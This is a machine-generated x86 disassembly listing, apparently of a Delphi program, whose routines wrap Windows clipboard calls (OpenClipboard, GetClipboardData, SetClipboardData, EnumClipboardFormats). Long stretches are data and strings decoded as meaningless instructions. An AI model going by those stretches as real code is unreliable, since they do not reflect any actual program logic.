and al 0x43
add ah ch
and al 0x43
add [ edx ] cl
push esp
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472616f
nop
inc eax
and al 0x43
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6c ]
imul esi [ eax + 0x62 ] 0x6472616f
adc al 0x24
inc ebx
add [ ecx + 0x41 ] dl
add [ eax ] al
add [ edi ] al
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_432498
push [ fs : eax ]
mov [ fs : eax ] esp
call EmptyClipboard
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43249f
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4324c0
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
call CloseClipboard
cmp [ ebx + 0xc ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x8 ]
call sub_41afb0
sub_4324ec
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebx + 0x4 ]
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebx + 0x8 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
call OpenClipboard
test eax eax
jne r-xdata
push ebx
push sub_432940
call sub_41aefc
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x1
mov [ ebx + 0xd ] 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
sub_432548
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x8 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_432568
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
push 0x1
call GetClipboardData
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4325da
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_404094
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov edx eax
mov eax ebx
call sub_40428c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4325e1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_4325e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_43268a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
call EnumClipboardFormats
mov ebx eax
test bx bx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov edx ebx
mov eax [ r-xdata ]
call sub_420698
test al al
je r-xdata
movzx eax bx
push eax
call EnumClipboardFormats
mov ebx eax
test bx bx
jne r-xdata
movzx eax bx
push eax
call GetClipboardData
mov esi eax
push 0x9
call GetClipboardData
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_4205a8
call sub_403b7c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432698
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_4326f0
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x2
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
mov esi eax
push esi
mov ecx ebx
mov dx 0x2
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4326f7
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_432700
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_432755
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x3
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
push eax
mov ecx ebx
mov dx 0x3
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43275c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_432764
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4325e8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_432698
jmp r-xdata
mov edx ebx
mov eax esi
call sub_414a98
mov edx ebx
mov eax esi
call sub_432700
jmp r-xdata
pop esi
pop ebx
retn
sub_4327cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_432841
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4324a4
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
call sub_42066c
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432848
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_432850
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_4328c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4324a4
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4328cc
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_4328d4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4327cc
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4149b4
mov edx ebx
mov eax esi
call sub_432850
jmp r-xdata
pop esi
pop ebx
retn
sub_432940
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43296a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43296f
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
call sub_403af8
mov ebx [ rw-data ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
jmp r-xdata
call sub_403b4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43299c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414988
test bl bl
jle r-xdata
xor eax eax
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4329d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432a01
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432a08
retn
mov eax [ rw-data ]
call sub_403344
sub_432a9c
mov al [ 0x300432a ]
or eax 0x74754254
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
dec esp
popad
jns r-xdata
add [ eax + 0x16004412 ] dh
push esp
push ebx
jo r-xdata
add [ eax ] al
in al 0xd3
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsubr [ ebx ]
inc ebx
add [ eax + eax ] ah
jne r-xdata
inc esp
add [ ecx + ecx * 2 + 0x49180041 ] dh
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx + ebp + 0x620b0043 ] bl
insb
inc edi
insb
jns r-xdata
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ ebx + eax * 2 + 0x35200043 ] al
inc esp
add [ esi + 0x35ec0044 ] bl
inc esp
add [ eax + ebx + 0x1fd80044 ] dl
inc esp
add [ edi + ebx ] bh
inc esp
add [ eax + ebp + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x381c0044
inc esp
add al bl
dec eax
inc esp
add [ edx + ebp ] ah
inc esp
add [ eax + 0xc00442a ] bl
sbb eax [ eax + eax + 0x78 ]
sub al [ eax + eax + 0x7c ]
inc esp
inc ebx
add [ eax ] dl
add [ ebx ] al
add cl [ eax + esi * 4 ]
sbb [ eax - 0x4ff14ffa ] dh
adc dh [ eax - 0x4fec4fdc ]
adc al 0xb0
out dx eax
inc esp
add [ eax ] bh
je r-xdata
add ah bl
sub eax [ ebx ]
and al 0x0
push 0x7466654c
or al 0x62
insb
inc edi
insb
jns r-xdata
and eax [ eax + eax + 0x38 ]
add [ eax ] bh
inc ebx
add [ eax ] ah
sbb al [ eax + eax - 0x74 ]
sbb [ eax + eax + 0x38 ] eax
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x432c4090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
sub al 0x43
add [ edx ] dh
sub eax 0x1840043
add [ eax ] al
aam 0xe9
inc ebx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x4fffbfcb ] ah
cmp [ eax + eax - 0x24 ] eax
xor al [ eax ]
clc
xor al [ eax ]
inc esp
inc esp
inc ebx
add [ eax - 0x77ffbbba ] dl
cmp al [ eax + eax - 0x4c ]
dec ecx
inc ecx
add [ eax ] bl
dec ecx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
push 0x68676952
je r-xdata
or eax 0x6c476c62
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
add al bh
xor al [ eax ]
or al 0xa6
inc ecx
add [ edx + eax * 2 - 0x59bfffbd ] ah
push 0x74746f42
outsd
insd
pop es
inc edx
jne r-xdata
inc eax
mov al [ 0xffffffff94004035 ]
xor eax 0x32dc0040
jns r-xdata
push 0xd706f54
bound ebp [ edi + eax * 2 + 0x6c ]
inc ecx
add [ esp + edx - 0x598bffbc ] dh
inc ecx
add [ eax + 0x15 ] ah
inc esp
add ah al
movsd [ edi ] [ esi ]
je r-xdata
add [ eax - 0x5a ] al
outsb
jae r-xdata
adc [ eax - 0x70 ] ch
sub al [ ebx ]
sar ah 0x2a
inc ebx
add [ ecx ] al
or dl [ esi + ecx * 2 + 0x75 ]
insd
inc edi
insb
jns r-xdata
inc ecx
add [ eax - 0x5a ] bl
inc ecx
add [ esi + 0x13a00041 ] ch
inc esp
add al cl
inc edx
inc ebx
add [ esp + edx ] dl
inc esp
add [ ebx + eax * 2 ] dl
inc ebx
add al dl
jmp r-xdata
push 0x10173
add [ eax ] al
add al 0x0
add [ eax ] al
lea eax [ eax ]
pushad
sub eax [ ebx ]
add [ eax ] al
add [ eax ] al
sub_432d62
outsb
jae r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ edx + 0x1 ] dh
add bh bh
sub [ ebp + 0x43 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
add [ eax + 0x3c00412e ] dl
add [ eax ] al
inc ah
sbb [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
inc edx
insb
insb
push ebp
jo r-xdata
add [ fs : eax ] al
jb r-xdata
salc
inc ebx
add [ ecx ] ah
add bh bh
movsb [ edi ] [ esi ]
sbb [ eax + eax + 0x40 ] al
sbb [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ edi ] al
inc ebx
imul ebp [ esi + 0x74 ] 0x40105473
add [ eax + 0x1 ] ch
add bh bh
or [ ebx + eax * 2 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edi + 0x72 ]
outsd
jne r-xdata
add [ eax ] eax
in al 0x18
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47050016 ] al
insb
jns r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push eax
add [ eax ] al
dec esp
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add al 0x46
insb
popad
je r-xdata
dec ecx
outsb
js r-xdata
add [ esi + 0x44 ] dl
popad
jo r-xdata
aam 0xd5
inc ebx
add [ eax + 0x25 ] dl
inc esp
add [ eax - 0x67ffbbdb ] al
inc ebp
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070012 ] al
add dh bh
je r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
push sub_432a9c
jae r-xdata
add [ eax ] al
inc [ esi + 0x44 ]
mov ecx 0x680041
add bh bh
inc esp
inc esp
adc [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040015 ] al
outsd
outsb
je r-xdata
push esp
inc esp
retn 0x41
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000f ] al
outsd
outsb
jae r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xd465646f
salc
inc ebx
add [ eax + eax ] dh
push [ eax + 0x4a ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
outsb
je r-xdata
call [ esp + ecx * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ esi ] al
dec esp
popad
jns r-xdata
add bh bh
xchg esp eax
dec esp
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push esp
dec ebx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
add al 0x44
outsd
ja r-xdata
add bh bh
hlt
add [ eax ] al
push [ eax + 0x24 ]
inc esp
add [ eax ] bl
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
outsb
je r-xdata
add [ edx - 0x3b010000 ] bl
inc esp
jne r-xdata
inc ebx
add [ eax - 0x68000000 ] cl
out dx al
inc ebx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
or al 0x33
inc ebx
add [ esp + eax + 0x82c0045 ] ah
inc ebp
add ah ah
add eax [ ebp ]
add [ edx - 0x5f33ffbf ] ah
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add al bl
cmc
inc esp
add al bl
inc [ eax + eax + 0x38 ]
cmpsd [ esi ] [ edi ]
inc esp
add al ah
or al 0x45
add [ ebp + ecx + 0x45 ] ch
add [ eax + ebp * 4 + 0x44 ] bh
add [ edx ] cl
push esp
inc edi
insb
jns r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] eax
outsb
add al 0x0
add [ eax ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
0xc4ff0000 0x4426
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
inc esp
push esp
adc [ eax ] al
jl r-xdata
inc eax
add [ eax ] ch
xor al 0x43
add [ ebx ] cl
push esp
inc edi
insb
jns r-xdata
push 0x7473694c
nop
in al 0x31
inc ebx
add [ edi ] al
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
or al bl
inc ebx
add al bl
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
jmp [ eax + 0x68004426 ]
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
add [ eax ] al
and [ edx ] 0x0
pop es
dec edi
arpl [ ecx + 0x6e ] bp
add [ bx + si ] dl
inc eax
add [ eax + 0x1 ] bh
add bh bh
in al dx
dec esp
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
outsb
jae r-xdata
sbb [ esi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7c65646f
sbb eax [ ebp ]
jl r-xdata
inc esi
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x2c656c62
sbb al [ ecx ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
cmp [ esi + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
adc [ eax ] al
jne r-xdata
push 0x6948776f
outsb
je r-xdata
push [ eax + 0x100434c ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add bh bh
mov al 0x4c
inc ebx
add [ ecx ] al
add edi ebp
dec [ ebx - 0x740f7426 ]
inc ebp
or [ eax + 0x33 ] dl
ror [ ebx - 0x3cb5173a ] cl
add [ eax ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
push 0x68636143
test al 0x32
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x7473694c
nop
xor [ ebx ] eax
xor al 0xef
inc ebx
add [ eax + eax ] cl
pop es
inc edx
jne r-xdata
dec ebp
outsd
jne r-xdata
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
popad
jb r-xdata
outsb
je r-xdata
imul ebp [ esi + 0x74 ] r-xdata
jo r-xdata
add bh bh
or [ 0x10044 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f500900
add [ edi ] al
push ebx
jo r-xdata
call eax
dec esp
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ edi ] bl
pop ds
add bh bh
ror [ ebx + eax * 2 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
add [ eax ] al
add al cl
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x32
inc ebx
add [ eax ] dh
je r-xdata
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
insb
inc ebx
insb
je r-xdata
outsb
adc [ eax ] al
push edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x30004332 ] ch
outsb
jae r-xdata
add [ eax + 0x32 ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x32 ] dl
inc ebx
add [ eax ] cl
add [ eax ] al
add al cl
adc [ eax ] al
sub_4332b8
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_44f624
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_43330c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44f678
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_43333c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_414910
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_4148cc
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_44faac
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_414828
sub_433388
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_43333c
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_44fcb8
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4333b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_4148f8
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_4148cc
sub_4333e4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403314
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_433428
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_433458
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4332b8
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_414210
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4143bc
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4334b8
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_414500
mov eax ebx
call sub_403344
sub_4334e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403314
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_43361c
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_403668
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4333e4
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_43357c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403344
mov eax esi
call sub_4335d8
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
